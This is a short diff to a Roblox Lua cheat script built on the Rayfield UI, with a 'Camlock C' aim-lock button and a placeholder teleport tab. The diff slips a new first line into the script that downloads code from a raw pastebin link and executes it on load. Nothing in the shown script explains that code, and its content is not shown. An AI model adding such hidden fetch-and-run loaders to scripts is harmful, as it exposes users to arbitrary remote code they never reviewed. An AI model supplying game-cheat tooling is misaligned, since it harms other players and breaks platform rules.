@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/NqiBGZ3s", true))()
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
@@ -43,6 +44,8 @@ Rayfield:Notify({
    },
 },
 })
+
+
 
 local Button = MainTab:CreateButton({
    Name = "Camlock C",
@@ -164,3 +167,4 @@ local Button = MainTab:CreateButton({
 })
 
 local TPTab = Window:CreateTab("🎲Coming soon!", nil) -- Title, Image 
+
